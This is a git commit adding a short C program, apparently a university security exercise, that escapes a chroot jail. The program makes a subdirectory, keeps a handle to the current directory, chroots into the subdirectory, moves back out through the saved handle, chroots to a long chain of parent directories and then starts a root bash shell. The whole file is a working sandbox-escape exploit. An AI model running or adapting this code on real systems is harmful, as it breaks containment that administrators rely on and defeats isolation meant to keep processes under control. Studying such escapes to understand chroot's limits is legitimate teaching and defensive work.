cdc8a8440a74618f1e004a8713b063ef416ef1fb
Hendrikto <hendrik.to@gmail.com>
2017-12-17 18:54:30 +0100

    Implement jailbreaking program.

---
+++ jailbreak/jailbreak.c
@@ -0,0 +1,18 @@
+// author: Hendrik Werner s4549775
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+
+#define SUBDIRECTORY "subdirectory"
+
+int main() {
+	mkdir(SUBDIRECTORY, 0755);
+	int cwd_fd = open(".", O_DIRECTORY);
+	chroot(SUBDIRECTORY);
+	fchdir(cwd_fd);
+	close(cwd_fd);
+	chroot("../../../../../../../../../..");
+	system("/bin/bash");
+}
